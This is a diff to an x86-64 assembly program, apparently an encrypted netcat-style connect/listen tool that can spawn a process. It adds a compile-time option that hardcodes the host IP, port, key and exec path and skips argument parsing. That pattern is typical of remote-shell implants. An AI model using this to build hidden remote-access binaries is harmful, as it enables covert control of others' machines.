@@ -4,6 +4,10 @@
 default rel
 bits 64
 
+%ifdef BAKED
+%include "baked.inc"
+%endif
+
 section .text
 global _start
 
@@ -191,6 +195,25 @@ _start:
     mov byte [rel g_mode], 0xFF  ; 0xFF = not set
     mov qword [rel g_exec], 0
     mov qword [rel g_child_pid], 0
+
+%ifdef BAKED
+    ; Baked configuration — skip CLI parsing
+    mov byte [rel g_mode], BAKED_MODE
+  %if BAKED_MODE == 0
+    mov dword [rel g_host], BAKED_IP_DWORD
+  %endif
+    mov word [rel g_port], BAKED_PORT_NET
+    cld
+    lea rsi, [rel baked_key_data]
+    lea rdi, [rel g_key]
+    mov ecx, 32
+    rep movsb
+  %ifdef BAKED_HAS_EXEC
+    lea rax, [rel baked_exec_data]
+    mov [rel g_exec], rax
+  %endif
+    jmp .parsed_ok
+%endif
 
     ; Walk argv[1] .. argv[argc-1]
     mov r14, 1              ; i = 1 (skip argv[0])
